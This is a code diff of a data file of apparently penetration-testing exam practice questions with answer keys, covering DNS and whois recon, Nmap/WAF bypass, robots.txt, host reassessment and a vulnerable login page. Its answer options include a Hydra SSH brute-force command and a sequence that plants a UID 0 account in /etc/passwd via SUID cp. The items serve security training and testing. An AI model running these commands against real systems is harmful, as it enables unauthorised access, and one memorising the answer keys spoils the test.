+        "academic-stores.someclouddomain.org:34.196.18.124, 34.233.45.248, 52.7.213.114, 54.174.10.37",
+        "certifications.someclouddomain.org:198.134.5.32",
+        "connection.someclouddomain.org:13.107.246.51, 13.107.213.51",
+        "logins.someclouddomain.org:198.134.5.46",
+        "your.someclouddomain.org:52.173.139.125",
+        "ITpartners.someclouddomain.org:104.43.140.101",
+        "ls.someclouddomain.org:67.199.248.13, 67.199.248.12",
+        "stores.someclouddomain.org:34.233.45.248, 52.7.213.114, 54.174.10.37, 34.196.18.124",
+        "www.someclouddomain.org:23.96.239.26"
       ].join("\n") },
       { label: "Output 2", text: [
-        "; <<>> DiG 9.18 <<>> acmefreight.example ANY","",
-        "acmefreight.example.    300  IN  A    203.0.113.20",
-        "acmefreight.example.    300  IN  MX   10 mail.acmefreight.example.",
-        "acmefreight.example.    300  IN  TXT  \"v=spf1 include:_spf.acmefreight.example -all\"",
-        "acmefreight.example.    300  IN  NS   ns1.acmefreight.example.",
-        "_dmarc.acmefreight.example. 300 IN TXT \"v=DMARC1; p=none; rua=mailto:dmarc@acmefreight.example\""
+        "nslookup Output","Server:  Unknown","Address: 8.8.8.8","",
+        "Non-Authoritative answer:","Name:    someclouddomain.org","Addresses:","245.62.183.182","245.145.184.203","",
+        "dig Output","; DiG 9.11.5-P4.testmachine-Ubuntu <<>> someclouddomain.org",";; global options: +cmd",
+        "someclouddomain.org.    300  IN  A 245.62.183.182",
+        "someclouddomain.org.    300  IN  A 245.145.184.203"
       ].join("\n") },
       { label: "Output 3", text: [
-        "whois acmefreight.example","",
-        "Domain Name: acmefreight.example","Registrar: Example Registrar, LLC","Creation Date: 2008-03-11T09:14:00Z",
-        "Registry Expiry Date: 2026-03-11T09:14:00Z","Registrant Organization: Acme Freight Co.",
-        "Name Server: ns1.acmefreight.example","Name Server: ns2.acmefreight.example","",
-        "whois 203.0.113.44","NetName: ACME-CLOUD-DC1","Organization: CloudHost Inc.","NetRange: 203.0.113.0 - 203.0.113.255"
+        "(command 1)","whois 245.62.183.203","",
+        "NetRange: 245.62.0.0 - 245.62.255.255","CIDR: 245.62.0.0/16","NetName: Amazon-05","NetHandle: NET-245-62-0-0-1",
+        "Parent: NET245 (NET 245-0-0-0-0)","NetType: Direct Allocation","OriginAS: AS56466, AS66522, AS7226",
+        "Organization:  Amazon.com, Inc. (AMAZON)","RegDate 2010-08-27","Updated: 2015-09-24",
+        "Ref: https://rdap.arin.net/registry/ip/245.62.183.203","",
+        "(command 2)","whois someclouddomain.org","",
+        "Domain Name: someclouddomain.org","Registry Domain ID: D20033912-LRJA","Updated Date: 2021-02-15T04:43:38Z",
+        "Creation Date: 1993-09-22T04:00:38Z","Registrar: LocalComputerPro's, Inc.",
+        "Registrar Abuse Contact Email: domainabuse@localcomputerpros.com","Registrar Abuse Contact Phone: 1234567789",
+        "Registry Expiry Date: 2021-08-14T04:00:00Z"
       ].join("\n") }
     ],
     blocks: [
-      { output: 0, kind: "radio", header: "Which host in Output 1 was most likely leaked unintentionally and is out of normal external scope? <small>(Output 1)</small>",
-        options: ["www.acmefreight.example", "vpn.acmefreight.example", "dev.acmefreight.example (10.10.5.12)", "mail.acmefreight.example"],
-        answer: "dev.acmefreight.example (10.10.5.12)",
-        why: "dev.acmefreight.example resolves to an RFC 1918 private address (10.10.5.12). An internal dev host showing up in public DNS is an information leak and would normally be out of external scope, so confirm it in the rules of engagement before touching it." },
-      { output: 0, kind: "checks", header: "Review Output 1.",
-        prompt: "Select the TWO assets most useful for building a password-spray target list for a later, in-scope phase:",
-        options: ["The list of employee email addresses", "vpn.acmefreight.example", "The TTL values", "careers@acmefreight.example only", "tracking.acmefreight.example"],
-        answers: ["The list of employee email addresses", "vpn.acmefreight.example"],
-        why: "Harvested emails reveal the username format, and an internet-facing VPN portal is a common authentication surface. Together they're what a spray would target (only if the ROE allows it). TTLs are irrelevant, and the careers mailbox alone isn't a user list." },
-      { output: 1, kind: "radio", header: "Based on the DMARC record in Output 2, what is the email-security weakness?",
-        options: ["SPF is missing", "DMARC policy is p=none, so spoofed mail is only monitored, not rejected", "The MX record points to the wrong host", "DNSSEC is disabled"],
-        answer: "DMARC policy is p=none, so spoofed mail is only monitored, not rejected",
-        why: "SPF is present and set to -all, but DMARC p=none means failing mail is still delivered. That makes the domain easier to spoof for phishing. Recommend moving to p=quarantine or p=reject after monitoring." },
-      { output: 2, kind: "dropdowns", header: "Review Output 3. Select the appropriate option for each dropdown.",
+      { output: 0, kind: "radio", header: "Which of the following tools created this output?",
+        options: ["Nmap", "WHOIS", "TheHarvester", "dig"], answer: "TheHarvester" },
+      { output: 0, kind: "radio", mono: true, dependsOn: 0, header: "Select the appropriate command to produce the output:",
+        optionsBy: {
+          "TheHarvester": ["theharvester -d someclouddomain.org -l 200 -b google.com", "theharvester -d google.com -l 200 -b someclouddomain.org"],
+          "Nmap": ["nmap -sV -p 1-200 someclouddomain.org", "nmap -sn someclouddomain.org -oN google.txt"],
+          "WHOIS": ["whois someclouddomain.org", "whois -h whois.arin.net someclouddomain.org"],
+          "dig": ["dig someclouddomain.org ANY", "dig @8.8.8.8 someclouddomain.org MX"]
+        },
+        answer: "theharvester -d someclouddomain.org -l 200 -b google.com" },
+      { output: 1, kind: "info", header: "Review Output 2 for the <code>nslookup</code> and <code>dig</code> commands:",
+        html: "<p>Use the provided public DNS server to find the appropriate IPs for someclouddomain.org.<br>The local DNS server does not have Internet access.</p><p>Your Domain: pentestdomain.com<br>Your IP Address: 10.97.55.62<br>Public DNS Server: 8.8.8.8<br>Private DNS Server: 192.168.20.66<br>Target Domain: someclouddomain.org</p>" },
+      { output: 1, kind: "checks", mono: true, header: "Select TWO commands that would produce the <code>nslookup</code> and <code>dig</code> output:",
+        options: [
+          "$ dig @8.8.8.8 +noall +answer someclouddomain.org",
+          "$ dig @192.168.20.66 someclouddomain.org +short",
+          "$ dig someclouddomain.org +noall +short",
+          "> nslookup someclouddomain.org 8.8.8.8",
+          "> nslookup someclouddomain.org 192.168.20.66",
+          "> nslookup someclouddomain.org"
+        ],
+        answers: ["$ dig @8.8.8.8 +noall +answer someclouddomain.org", "> nslookup someclouddomain.org 8.8.8.8"] },
+      { output: 2, kind: "dropdowns", header: "Review Output 3. Select the appropriate option for each dropdown",
         items: [
-          { prompt: "Who operates the IP address behind vpn.acmefreight.example?", options: ["Acme Freight Co.", "Example Registrar, LLC", "CloudHost Inc.", "ns1.acmefreight.example"], answer: "CloudHost Inc.",
-            why: "The IP whois lists CloudHost Inc. as the organization for the 203.0.113.0/24 block, so the VPN is hosted at a cloud provider, not on-premises." },
-          { prompt: "When was the domain first registered?", options: ["2008-03-11", "2026-03-11", "2024", "ns2.acmefreight.example"], answer: "2008-03-11",
-            why: "The Creation Date is 2008-03-11. The 2026 date is the expiry." }
+          { prompt: "Where is the domain being hosted?", options: ["LocalComputerPro's.com", "ARIN", "Someclouddomain", "Amazon"], answer: "Amazon" },
+          { prompt: "Who registered the domain?", options: ["ARIN", "Someclouddomain", "LocalComputerPro's, Inc.", "Amazon"], answer: "LocalComputerPro's, Inc." },
+          { prompt: "When was the domain registered?", options: ["2021-02-15T04:43:38Z", "2010-08-27", "1993-09-22T04:00:38Z", "2015-09-24"], answer: "1993-09-22T04:00:38Z" }
         ] }
-    ]
+    ],
+    explain: `
+      <h3>Output 1</h3>
+      <ul>
+        <li>The list of e-mail addresses and hosts gathered by searching Google is typical of <strong>theHarvester</strong>.</li>
+        <li><code>-d</code> is the target domain, <code>-l 200</code> limits the results to 200 and <code>-b</code> names the data source. The other command swaps the domain and the source. In the real tool the source is a short name such as <code>google</code>.</li>
+      </ul>
+      <h3>Output 2</h3>
+      <ul>
+        <li>The local DNS server has no Internet access, so both lookups must use the public server, <strong>8.8.8.8</strong>.</li>
+        <li><code>nslookup someclouddomain.org 8.8.8.8</code> shows that server in its output, and <code>dig @8.8.8.8 +noall +answer</code> returns the full A record lines. <code>+short</code> would print only the IP addresses.</li>
+      </ul>
+      <h3>Output 3</h3>
+      <ul>
+        <li>The IP address record names <strong>Amazon</strong> as the organization that hosts it.</li>
+        <li>The domain record lists the registrar <strong>LocalComputerPro's, Inc.</strong> and the creation date <strong>1993-09-22T04:00:38Z</strong>. The 2010 and 2015 dates belong to the IP address block.</li>
+      </ul>`
   },
 
-  /* ---------------- PBQ 4: network diagram + Nmap (segmentation) ---------------- */
+  /* ---------------- PBQ 4: network diagram + Nmap (CDN/WAF bypass) ---------------- */
   {
     type: "sim",
     kind: "Performance-based question",
-    title: "Nmap results: is the segmentation holding?",
+    title: "Nmap scans: web application behind a CDN/WAF",
     scenario: [
-      "As part of a PCI-style internal test, you scanned from the <strong>corporate user VLAN</strong> toward the cardholder data environment (CDE). The design says users should reach the jump host only, and the jump host should reach the database.",
-      "<strong>Instructions:</strong> Click the jump host and the database server to review each scan, then choose the finding and the two best remediations.",
-      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
+      "A penetration tester performs several Nmap scans against the web application for a client.",
+      "<strong>Instructions:</strong> Click on the WAF and servers to review the results of the Nmap scans. Then click on each tab to select the appropriate vulnerability and remediation options.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
     ],
     nodes: {
-      jump: { title: "Jump host", name: "Jump host", host: "jump01 (10.50.1.10)", icon: "srv", zone: "cdn",
-        text: "Nmap scan from 10.40.8.33 (user VLAN)\nNmap scan report for 10.50.1.10\nHost is up (0.002s latency).\nPORT     STATE  SERVICE\n22/tcp   open   ssh\n3389/tcp open   ms-wbt-server" },
-      db: { title: "Database server", name: "Database server", host: "cde-db01 (10.50.2.20)", icon: "srv", zone: "prod",
-        text: "Nmap scan from 10.40.8.33 (user VLAN)\nNmap scan report for 10.50.2.20\nHost is up (0.003s latency).\nPORT     STATE  SERVICE\n1433/tcp open   ms-sql-s\n3389/tcp open   ms-wbt-server" }
+      cdn: { title: "CDN/WAF",
+        text: "Nmap scan report for 205.3.45.68\nHost is up (0.016s latency).\nPORT     STATE    SERVICE    VERSION\n80/tcp   open     http       nginx\n443/tcp  open     ssl/https  nginx\n3306/tcp filtered mysql" },
+      app: { title: "App server",
+        text: "Nmap scan report for 103.2.45.51\nHost is up (0.341s latency).\nPORT     STATE    SERVICE   VERSION\n80/tcp   open     http      nginx 1.18.0\n443/tcp  open     ssl/http  nginx 1.18.0\n3306/tcp filtered mysql" },
+      db: { title: "DB server",
+        text: "Nmap scan report for 103.1.45.50\nHost is up (0.046s latency).\nPORT     STATE    SERVICE   VERSION\n80/tcp   filtered http\n443/tcp  filtered ssl/http\n3306/tcp filtered mysql" }
     },
     vuln: {
-      prompt: "Based on the scans, select the <strong>most</strong> accurate finding:",
+      prompt: "Based on the output text, select the <strong>most</strong> likely vulnerability:",
       options: [
-        "The database is unreachable from the user VLAN, so segmentation is effective.",
-        "The user VLAN can reach the CDE database directly on 1433/tcp, so segmentation is not enforced.",
-        "The jump host is running an outdated SSH version.",
-        "The database is vulnerable to SQL injection."
+        "Exploit a privilege escalation attack on App01.example.com.",
+        "Bypass the WAF to communicate directly with App01.example.com.",
+        "Execute a SQL injection attack against DBProd.example.com.",
+        "Perform a SSRF attack against App01.example.com from CDN.example.com."
       ],
-      answer: "The user VLAN can reach the CDE database directly on 1433/tcp, so segmentation is not enforced."
+      answer: "Bypass the WAF to communicate directly with App01.example.com."
     },
     rem: {
-      prompt: "Select the TWO <strong>best</strong> remediations:",
+      prompt: "Select the two <strong>best</strong> remediation options:",
       options: [
-        "Add firewall/ACL rules so only the jump host can reach cde-db01, and deny the user VLAN.",
-        "Restrict RDP and SQL on cde-db01 to the jump host's address only.",
-        "Change the SQL Server port from 1433 to a non-standard port.",
-        "Ask users not to connect to the database.",
-        "Install antivirus on the database server.",
-        "Shorten the DHCP lease on the user VLAN."
+        "Throttle the number of concurrent connections to CDN.example.com.",
+        "Change the default ports used for the web server on App01.example.com.",
+        "Restrict direct communications to App01.example.com to only approved components.",
+        "Require an additional authentication header value between CDN.example.com and App01.example.com.",
+        "Change the default port used for the MySQL Database Connection to DBProd.example.com.",
+        "Configure a host-based intrusion detection system on App01.example.com."
       ],
       answers: [
-        "Add firewall/ACL rules so only the jump host can reach cde-db01, and deny the user VLAN.",
-        "Restrict RDP and SQL on cde-db01 to the jump host's address only."
+        "Restrict direct communications to App01.example.com to only approved components.",
+        "Require an additional authentication header value between CDN.example.com and App01.example.com."
       ]
     },
     explain: `
       <h3>Reading the scans</h3>
       <ul>
-        <li>The scan was run <strong>from the user VLAN</strong>. It shows <code>cde-db01</code> answering on <code>1433/tcp</code> (SQL) and <code>3389/tcp</code> (RDP), so a normal user segment can talk straight to the database.</li>
-        <li>The design intends users to reach only the jump host, and only the jump host to reach the database. The database being reachable from the user VLAN means the <strong>segmentation control has failed</strong>.</li>
-        <li>Nothing in the output shows an SSH version or any SQL injection, so those options aren't supported by the evidence.</li>
+        <li><strong>CDN/WAF</strong> has 80 and 443 open. That is expected, because it is the public front door.</li>
+        <li><strong>App01</strong> also answers directly on 80 and 443 and reveals <code>nginx 1.18.0</code>. An attacker can send requests straight to it and <strong>skip the WAF's inspection</strong>.</li>
+        <li><strong>DBProd</strong> shows every port as filtered, so the scans give no direct path for SQL injection against it. Nothing in the output points to privilege escalation or SSRF.</li>
       </ul>
       <h3>Remediation</h3>
       <ul>
-        <li><strong>Enforce the segmentation at the network layer:</strong> firewall or ACL rules that permit only the jump host to reach <code>cde-db01</code> and deny the user VLAN.</li>
-        <li><strong>Lock the services to the jump host:</strong> host firewall rules so RDP and SQL on the database accept connections only from the jump host's IP.</li>
-        <li>Changing the port is security through obscurity, antivirus doesn't address reachability, and "ask users not to connect" is not a control.</li>
+        <li><strong>Restrict direct communications to App01</strong> so only approved components, such as the CDN/WAF address ranges, can reach it.</li>
+        <li><strong>Require an authentication header between the CDN and App01</strong> so the app server rejects requests that did not come through the CDN.</li>
+        <li>Throttling the CDN does not stop a bypass, changing ports only hides services, MySQL already shows as filtered, and an intrusion detection system detects activity without closing the path.</li>
       </ul>`
   },
 
-  /* ---------------- PBQ 5: HTTP response header hotspot ---------------- */
+  /* ---------------- PBQ 5: robots.txt hotspot ---------------- */
   {
     type: "hotspot",
     kind: "Performance-based question",
-    title: "Review the HTTP response headers",
+    title: "Reconnaissance: review robots.txt",
     scenario: [
-      "While testing <code>https://shop.acmefreight.example</code>, you captured the server's response headers for the authenticated area.",
-      "<strong>Instructions:</strong> Select the three header issues you should report, and choose the single highest-priority fix.",
+      "A penetration tester is performing reconnaissance for a web application assessment. Upon investigation, the tester reviews the robots.txt file for items of interest.",
+      "<strong>Instructions:</strong> Select the tool the penetration tester should use for further investigation. Select the three entries in the robots.txt file that the penetration tester should recommend for removal.",
       "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
     ],
-    url: "HTTP/1.1 200 OK  —  response headers",
-    listPrompt: "Select the THREE header findings you should report:",
+    url: "http://example.com/robots.txt",
+    listPrompt: "Select the three robots.txt entries the penetration tester should recommend for removal:",
     lines: [
-      "HTTP/1.1 200 OK",
-      "Date: Sat, 21 Nov 2026 15:00:00 GMT",
-      "Server: Apache/2.4.29 (Ubuntu) PHP/7.2.3",
-      "Content-Type: text/html; charset=UTF-8",
-      "Set-Cookie: SESSIONID=8f3b...9a; Path=/",
-      "Cache-Control: no-store",
-      "X-Frame-Options: SAMEORIGIN",
-      "Strict-Transport-Security: max-age=0",
-      "Content-Length: 5120"
+      "User-agent: *",
+      "Disallow: /search",
+      "Disallow: /search/about",
+      "User-agent: acunetix",
+      "crawl-delay: 10",
+      "Disallow: /search/static",
+      "User-agent: Baidu",
+      "crawl-delay: 12",
+      "User-agent: Slurp",
+      "crawl-delay: 20",
+      "Disallow: /sdch",
+      "User-agent: Comptia",
+      "Disallow: /admin",
+      "Disallow: /wp-admin",
+      "crawl-delay: 15",
+      "Disallow: /groups",
+      "Disallow: /?hl=",
+      "Disallow: /wp-login.php"
     ],
-    remove: [2, 4, 7],
-    removeLabelPrompt: true,
+    remove: [12, 13, 17],
     tool: {
-      header: "Highest-priority fix",
-      prompt: "Which single change should be the highest priority?",
-      options: [
-        "Set the session cookie with HttpOnly, Secure and SameSite attributes",
-        "Remove the Content-Length header",
-        "Change Content-Type to application/json",
-        "Add a Date header"
-      ],
-      answer: "Set the session cookie with HttpOnly, Secure and SameSite attributes"
+      header: "Tool",
+      prompt: "Given the entries in robots.txt, select the tool the penetration tester should use for further investigation:",
+      options: ["Mimikatz", "WPScan", "SQLmap", "Brakeman"],
+      answer: "WPScan"
     },
     explain: `
-      <h3>The three findings</h3>
+      <h3>Entries to remove</h3>
       <ul>
-        <li><strong>Server banner</strong> (<code>Apache/2.4.29 ... PHP/7.2.3</code>): it discloses exact software versions, which helps an attacker match known exploits. Suppress the version in the banner.</li>
-        <li><strong>Session cookie with no flags</strong> (<code>Set-Cookie: SESSIONID=...; Path=/</code>): no HttpOnly, Secure or SameSite, so the session is exposed to theft via XSS and to being sent over plaintext or cross-site.</li>
-        <li><strong>HSTS disabled</strong> (<code>Strict-Transport-Security: max-age=0</code>): a max-age of 0 turns HSTS off, so browsers won't force HTTPS. Set a long max-age (and consider includeSubDomains).</li>
-        <li>The other headers are fine: <code>no-store</code>, <code>X-Frame-Options: SAMEORIGIN</code>, Content-Type and Content-Length are all reasonable.</li>
+        <li><strong>13: <code>Disallow: /admin</code></strong>, <strong>14: <code>Disallow: /wp-admin</code></strong> and <strong>18: <code>Disallow: /wp-login.php</code></strong> point anyone who reads the file to the administration and login pages.</li>
+        <li><code>Disallow</code> only asks crawlers to stay away. It does not block access, so these pages also need protection such as MFA, rate limiting and IP restrictions.</li>
+        <li>The other lines are crawler names, crawl delays and ordinary site paths, which are much less sensitive.</li>
       </ul>
-      <h3>Highest priority</h3>
+      <h3>Tool</h3>
       <ul>
-        <li>Securing the <strong>session cookie</strong> is the top fix: a stolen session ID leads directly to account takeover. HttpOnly blocks script access, Secure keeps it on HTTPS, and SameSite limits cross-site sending.</li>
+        <li><strong>WPScan:</strong> <code>/wp-admin</code> and <code>/wp-login.php</code> indicate WordPress, and WPScan checks WordPress core, plugins, themes and users.</li>
+        <li>Mimikatz extracts Windows credentials, SQLmap tests for SQL injection (nothing here points to it) and Brakeman reviews Ruby on Rails source code.</li>
       </ul>`
   },
 
-  /* ---------------- PBQ 6: post-exploitation analysis (recognition) ---------------- */
+  /* ---------------- PBQ 6: host reassessment (Part 1 / Part 2) ---------------- */
   {
     type: "recon2",
     kind: "Performance-based question",
-    title: "Post-exploitation: enumerating a Linux host",
+    title: "Host reassessment: does the vulnerability still exist?",
     scenario: [
-      "You have a low-privilege shell on an in-scope Linux host and are documenting the privilege-escalation paths an attacker could use, so the client can close them.",
-      "<strong>Instructions — Part 1:</strong> Review the enumeration output and identify the most promising escalation path.",
-      "<strong>Part 2:</strong> Review the running-service note, then identify the finding and select the two remediations the client should apply.",
-      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset</strong> button."
+      "A previous penetration test report identified a host with vulnerabilities that was successfully exploited. Management has requested that an internal member of the security team reassess the host to determine if the vulnerability still exists.",
+      "<strong>Instructions — Part 1:</strong> Analyze the output and select the command to exploit the vulnerable service.",
+      "<strong>Part 2:</strong> Click on each command to view its output. Select the appropriate set of commands to escalate privileges. Identify which remediation steps should be taken.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
     ],
     part1: {
-      label: "Local enumeration output",
+      label: "Reconnaissance data",
       terminal: [
-        "lowpriv@app02:~$ id",
-        "uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)",
+        "root@attackermachine:~# nmap -sC -T4 192.168.10.2",
+        "Starting Nmap 6.26SVN ( http://nmap.org ) at 2021-04-19 14:30 EST",
+        "Nmap scan report for 192.168.10.2",
+        "Host is up (0.27s latency).",
+        "Port        State       Service",
+        "22/tcp      open        ssh",
+        "23/tcp      closed      telnet",
+        "80/tcp      open        http",
+        "111/tcp     closed      rpcbind",
+        "445/tcp     open        samba",
+        "3389/tcp    closed      rdp?",
+        "Nmap done: 1 IP Address (1 host up) scanned in 5.48 seconds",
         "",
-        "lowpriv@app02:~$ sudo -l",
-        "User lowpriv may run the following commands on app02:",
-        "    (ALL) NOPASSWD: /usr/bin/find",
-        "",
-        "lowpriv@app02:~$ find / -perm -4000 -type f 2>/dev/null",
-        "/usr/bin/passwd",
-        "/usr/bin/sudo",
-        "/usr/bin/mount",
-        "",
-        "lowpriv@app02:~$ cat /etc/crontab | grep -v '^#'",
-        "*/10 * * * * root /opt/scripts/collect.sh",
-        "",
-        "lowpriv@app02:~$ ls -l /opt/scripts/collect.sh",
-        "-rwxrwxrwx 1 root root 214 Nov 18 02:00 /opt/scripts/collect.sh"
+        "root@attackermachine:~# enum4linux -S 192.168.10.2",
+        "user:[games] rid:[0x3f2]",
+        "user:[nobody] rid:[0x1f5]",
+        "user:[bind] rid:[0x4ba]",
+        "user:[proxy] rid:[0x402]",
+        "user:[syslog] rid:[0x4b4]",
+        "user:[www-data] rid:[0x42a]",
+        "user:[root] rid:[0x3e8]",
+        "user:[news] rid:[0x3fa]",
+        "user:[lowpriv] rid:[0x3fa]"
       ].join("\n"),
-      prompt: "Which finding is the <strong>most</strong> direct privilege-escalation path on this host?",
+      prompt: "Which of the following commands would <strong>most</strong> likely exploit the services?",
       options: [
-        "The SUID /usr/bin/passwd binary",
-        "lowpriv can run /usr/bin/find via sudo with NOPASSWD",
-        "The host is missing antivirus",
-        "The /etc/crontab file is readable"
+        "medusa -h 192.168.10.2 -u admin -P 500-worst-passwords.txt -M rpcbind",
+        "ncrack -T5 -user lowpriv -P 500-worst-passwords.txt -p telnet -g CL=1 192.168.10.2",
+        "crowbar -b rdp -s 192.168.10.2/32 -u administrator -C 500-worst-passwords.txt -n 1",
+        "hydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22"
       ],
-      answer: "lowpriv can run /usr/bin/find via sudo with NOPASSWD",
-      why: "sudo -l shows lowpriv may run find as root with no password. find is a well-known GTFOBins binary that can run commands, so sudo access to it is a direct path to root. passwd and mount are SUID by design and not misconfigured here. A world-writable root cron script is also a serious issue (Part 2), but the sudo find entry is the most direct single step."
+      answer: "hydra -l lowpriv -P 500-worst-passwords.txt -t 4 ssh://192.168.10.2:22"
     },
     part2: {
-      label: "Additional note",
+      label: "Commands",
       commands: [
-        "cron runs /opt/scripts/collect.sh as root every 10 minutes",
-        "/opt/scripts/collect.sh is mode 0777 (world-writable)",
-        "the lowpriv user can edit the script contents"
+        { cmd: "find / -perm -2 -type f 2>/dev/null | xargs ls -l",
+          out: "-rw-rw-rw- 1 root     root        0 Apr 19 14:02 /var/tmp/session.lock\n-rw-rw-rw- 1 www-data www-data 1204 Apr 18 09:11 /var/www/html/uploads/cache.tmp" },
+        { cmd: "cat /etc/fstab",
+          out: "# <file system>  <mount point>  <type>  <options>          <dump> <pass>\n/dev/sda1        /              ext4    errors=remount-ro  0      1\n/dev/sda2        none           swap    sw                 0      0" },
+        { cmd: "find / -perm -u=s -type f 2>/dev/null | xargs ls -l",
+          out: "-rwsr-xr-x 1 root root 153976 Feb 28  2021 /bin/cp\n-rwsr-xr-x 1 root root  55528 Feb  7  2021 /bin/mount\n-rwsr-xr-x 1 root root  67816 Feb  7  2021 /bin/su\n-rwsr-xr-x 1 root root  68208 Jan 10  2021 /usr/bin/passwd\n-rwsr-xr-x 1 root root 166056 Jan 19  2021 /usr/bin/sudo" },
+        { cmd: "grep \"/bin/bash\" /etc/passwd | cut -d':' -f1-4,6,7",
+          out: "root:x:0:0:/root:/bin/bash\nlowpriv:x:1001:1001:/home/lowpriv:/bin/bash" },
+        { cmd: "cut -d':' -f1 /etc/passwd",
+          out: "root\ndaemon\nbin\nsys\ngames\nnews\nproxy\nwww-data\nsyslog\nbind\nnobody\nlowpriv" }
       ],
-      cmdNote: "The findings to assess are the sudo rule, the SUID binaries, and the world-writable root-owned cron script.",
-      escPrompt: "Besides the sudo rule, which configuration is the <strong>second</strong> clear escalation path here?",
+      escPrompt: "Which of the following sets of commands <strong>most</strong> likely escalates privileges?",
       escOptions: [
-        "A world-writable script that runs as root on a schedule (/opt/scripts/collect.sh)",
-        "The SUID bit on /usr/bin/passwd",
-        "The readable /etc/crontab",
-        "The lowpriv user being in its own group"
+        "perl -le 'print crypt(\"password\", \"AA\")'\ncat /etc/passwd > /tmp/passwd\necho \"root2:AA6tQYSfGxd/A:0:0:root:/root:/bin/bash\" >> /tmp/passwd\ncp /tmp/passwd /etc/passwd",
+        "openssl passwd password\necho \"root2:5ZOYXRfHVZ7OY:0:0:root:/root:/bin/bash\" >> /etc/passwd",
+        "echo \"net user root2 password /add\" > /home/lowpriv/backup.sh\necho \"net localgroup administrators root2 /add\" >> /home/lowpriv/backup.sh",
+        "./ /tmp/scripts/exploithost.sh -h 192.168.10.2 > output.txt\ncat output.txt",
+        "netcat -e 22 192.168.10.2\ntcpdump -i eth0 192.168.10.2"
       ],
-      escAnswer: "A world-writable script that runs as root on a schedule (/opt/scripts/collect.sh)",
-      escWhy: "collect.sh is mode 0777 and runs as root from cron every 10 minutes, so any user who can edit it has their changes executed as root on the next run. passwd being SUID is normal, the crontab being readable just reveals the schedule, and a user in its own primary group is not a weakness.",
-      remPrompt: "Which TWO remediations should the client apply? <strong>(Select two.)</strong>",
+      escAnswer: "perl -le 'print crypt(\"password\", \"AA\")'\ncat /etc/passwd > /tmp/passwd\necho \"root2:AA6tQYSfGxd/A:0:0:root:/root:/bin/bash\" >> /tmp/passwd\ncp /tmp/passwd /etc/passwd",
+      remPrompt: "Assuming the privileged escalation was successful, which of the following remediations should be taken? <strong>(Select two).</strong>",
       remOptions: [
-        "Remove the NOPASSWD sudo rule for /usr/bin/find (or scope sudo to a specific safe command)",
-        "Set /opt/scripts/collect.sh to be writable only by root (e.g. 0755, root-owned)",
-        "Delete /etc/crontab entirely",
-        "Remove the SUID bit from /usr/bin/passwd",
-        "Rename the lowpriv account",
-        "Disable cron for all users"
+        "Remove no_root_squash from fstab",
+        "Make backup script not world-writeable",
+        "Strengthen password of lowpriv account",
+        "Encrypt the /etc/passwd file",
+        "Remove SUID bit from cp",
+        "Update SSH to latest version"
       ],
       remAnswers: [
-        "Remove the NOPASSWD sudo rule for /usr/bin/find (or scope sudo to a specific safe command)",
-        "Set /opt/scripts/collect.sh to be writable only by root (e.g. 0755, root-owned)"
-      ],
-      remWhy: "The two real issues are the over-broad sudo rule and the world-writable root cron script, so both get fixed: tighten or remove the sudo entry, and make the script writable only by root. Removing SUID from passwd would break password changes, deleting /etc/crontab or disabling cron breaks legitimate jobs, and renaming the account changes nothing."
-    }
+        "Strengthen password of lowpriv account",
+        "Remove SUID bit from cp"
+      ]
+    },
+    explain: `
+      <h3>Part 1: getting in</h3>
+      <ul>
+        <li>Only 22, 80 and 445 are open. Telnet, rpcbind and RDP are closed, so the commands aimed at them cannot work.</li>
+        <li><code>enum4linux</code> returned the user <code>lowpriv</code>, so <strong>Hydra against SSH</strong> with that name and a weak-password list is the best choice.</li>
+      </ul>
+      <h3>Part 2: escalating</h3>
+      <ul>
+        <li>The SUID search shows that <code>/bin/cp</code> runs as root. A copy of <code>/etc/passwd</code> with an extra UID 0 account can therefore be copied over the original.</li>
+        <li>Appending straight to <code>/etc/passwd</code> fails for a normal user, <code>net user</code> is a Windows command, and the last two options do not raise privileges.</li>
+      </ul>
+      <h3>Remediation</h3>
+      <ul>
+        <li><strong>Remove the SUID bit from cp</strong> to close the escalation path.</li>
+        <li><strong>Strengthen the lowpriv password</strong> to close the way in.</li>
+      </ul>`
+  },
+  /* ---------------- PBQ 7: browser review (certificate / source / cookies) ---------------- */
+  {
+    type: "websim",
+    kind: "Performance-based question",
+    title: "Secure System: review and remediate the website",
+    scenario: [
+      "You are a penetration tester reviewing a client's website through a web browser.",
+      "<strong>Instructions:</strong> Review all components of the website through the browser to determine if vulnerabilities are present. Remediate <strong>ONLY</strong> the highest vulnerability from either the certificate, source, or cookies.",
+      "If at any time you would like to bring back the initial state of the simulation, please click the <strong>Reset All</strong> button."
+    ],
+    source: ["\u003chtml>", "\u003chead>", "\u003ctitle>Secure Login\u003c/title>", "\u003c/head>", "\u003cbody>", "\u003cmeta", "content=\"c2RmZGZnaHNzmtqbGdoc2Rma2pnaGRzZmpoZGZvaWI2aGRmc29pYmp3ZXJndWIvdm9pb2hzZGd1aWJoaGR1ZmZpZ2hzZDtpYmhqZHNmc291Ymdoc3ZGI1Z2ZI", "bnNkbGtqO2Job3VpYXNpZGZubXM7bGtkZmliaHZsb3NhZGJua2N4dnZ1aWdia3NqYWVqa2JmbGI1Y3Z2Z2JqbGFzZWJmaXVkZGZidmxiamFmbGhkc3VmZyBuc2pyZ2hzZHVmaG", "d1d3NmZ2hqZHNmZmJ1c2hmdWRzZmZoZ3U3cndweWhmamRzZmZ2bnVzZm53cnVmYnZ1ZXJ2==\" name=\"csrf-token\" />", "\u003cselect>\u003cscript>", "document.write(\",OPTION value=1>\"+document.location.herf.substring(document.location.herf.indexOf(\"f=\")+16)+\"\u003c/OPTION>\");", "\u003c/script>\u003c/select>", "\u003cdiv align=\"center\">", "\u003cfrom action=\"\u003cc:url value='main.do'/>\"method=\"post\">", "\u003cdiv style>\"margin-top:200px:margin-bottom:10px;\">", "\u003cspan style=\"width:500px:color:blue;font-size:30px;font-weight:bold;border-bottom:1px solid blue;\">Comptia Secure System Login\u003c/span>", "\u003c/div>", "\u003cdiv style=\"margin-bottom:5px;\">", "\u003cspan style=\"width:100px:\">Name\u003c/span>", "\u003cinput style=\"width:150px;\" type=\"text\" name=\"name\" id=\"name\" 